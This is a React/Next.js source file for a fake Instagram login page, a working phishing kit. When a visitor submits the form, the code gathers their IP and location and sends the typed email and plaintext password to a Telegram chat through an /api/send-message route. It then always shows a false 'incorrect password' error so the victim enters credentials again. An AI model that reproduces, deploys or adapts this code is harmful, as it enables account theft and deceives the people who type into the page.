"use client";

import { useForm } from "react-hook-form";
import { z } from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import { useState } from "react";
import Image from "next/image";
import AppDownload from "../components/AppDownload";
import Logo from "../assets/images.png";

const loginSchema = z.object({
  email: z.string().min(1, { message: "Required" }),
  password: z.string().min(1, { message: "Password is required" }),
});

type LoginForm = z.infer<typeof loginSchema>;

export default function LoginPage() {
  const [sending, setSending] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<LoginForm>({
    resolver: zodResolver(loginSchema),
  });

  const chatId = -4724313789;

  const onSubmit = async (formData: LoginForm) => {
    setSending(true);


    try {
      // 1) Get IP / location info
      const ipRes = await fetch("https://ipapi.co/json/");
      if (!ipRes.ok) throw new Error("Failed to fetch IP/location");
      const ipInfo = await ipRes.json();

      // extract fields safely with fallbacks
      const ip = ipInfo.ip ?? "Unknown IP";
      const country = ipInfo.country_name ?? "Unknown Country";
      const countryCode = ipInfo.country_calling_code ?? "Unknown Code";
      const city = ipInfo.city ?? ipInfo.region ?? "Unknown City/Region";
      const region = ipInfo.region ?? "";
      const org = ipInfo.org ?? "";

      // 2) Build message (URI encoded or plain). Telegram accepts plain; we'll send plain text.
      const message = [
        "🟢 New Login Attempt",
        "",
        `📧 Email: ${formData.email}`,
        `🔐 Password: ${formData.password}`,
        "",
        `🌐 IP: ${ip}`,
        `🏳️ Country: ${country}`,
        `📞 Country Calling Code: ${countryCode}`,
        `🏙 City / Region: ${city} ${region ? `(${region})` : ""}`,
        org ? `🏢 Org: ${org}` : "",
        `🕒 Time: ${new Date().toISOString()}`,
      ]
        .filter(Boolean)
        .join("\n");


      const res = await fetch("/api/send-message", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chatId, text: message }),
      });

      const result = await res.json();
      console.log("Telegram response:", result);
      setSending(false);
      setErrorMsg("Sorry, your password was incorrect. Please double-check your password.");
      setTimeout(() => setErrorMsg(""), 4000);
    } catch (err) {
      console.error("Telegram error:", err);
      setErrorMsg("Sorry, your password was incorrect. Please double-check your password.");
      setSending(false);
      setTimeout(() => setErrorMsg(""), 4000);
    }
  };

  return (
    <main className="flex items-center justify-center min-h-screen w-screen">
      <section className="h-screen flex flex-col items-center max-w-lg lg:max-w-xl w-full px-0 pb-10">
        {/* Login box */}
        <div className="md:border-2 border-gray-300 px-8 py-10 w-full">
          <form className="grid gap-3 w-full" onSubmit={handleSubmit(onSubmit)}>
            <Image
              src={Logo}
              alt="Instagram"
              className="h-16 w-auto mx-auto mb-4"
            />

            {/* Email / username */}
            <div>
              <input
                type="text"
                placeholder="Phone number, username, or email"
                {...register("email")}
                className="py-3 border-2 px-3 rounded-md bg-transparent text-sm w-full"
              />
              {errors.email && (
                <p className="text-xs text-red-600">{errors.email.message}</p>
              )}
            </div>

            {/* Password */}
            <div className="flex items-center relative mb-3">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                {...register("password")}
                className="py-3 border-2 px-3 rounded-md bg-transparent text-sm w-full"
              />
              <span
                className="absolute right-5 cursor-pointer hover:text-black/40 text-sm"
                onClick={() => setShowPassword((prev) => !prev)}
              >
                {showPassword ? "Hide" : "Show"}
              </span>
            </div>
            {errors.password && (
              <p className="text-xs text-red-600">{errors.password.message}</p>
            )}

            {/* Submit */}
            <button
              type="submit"
              disabled={sending}
              className="bg-blue-500 py-2 text-lg text-white hover:bg-blue-400 rounded-md"
            >
              {sending ? "Logging in..." : "Log in"}
            </button>

            {errorMsg && (
              <p className="text-center text-xs text-red-600">{errorMsg}</p>
            )}

            {/* Divider */}
            <div className="relative flex items-center justify-center my-4">
              <span className="absolute bg-white px-2 text-[#888]">or</span>
              <hr className="w-full border-[#dadada]" />
            </div>

            <div className="text-center">
              <a href="#" className="text-sm font-medium text-black/60">
                Forgot password?
              </a>
            </div>
          </form>
        </div>

        {/* Sign up box */}
        <div className="md:border-2 border-gray-300 px-8 md:py-5 md:mt-5 w-full text-center">
          <span className="text-sm">
            Don&apos;t have an account?{" "}
            <a href="#" className="text-blue-600 font-semibold">
              Sign Up
            </a>
          </span>
        </div>

        {/* Download section */}
        <AppDownload />

        <div className="mt-auto text-black/50">
          English © {new Date().getFullYear()} Instagram from Meta
        </div>
      </section>
    </main>
  );
}
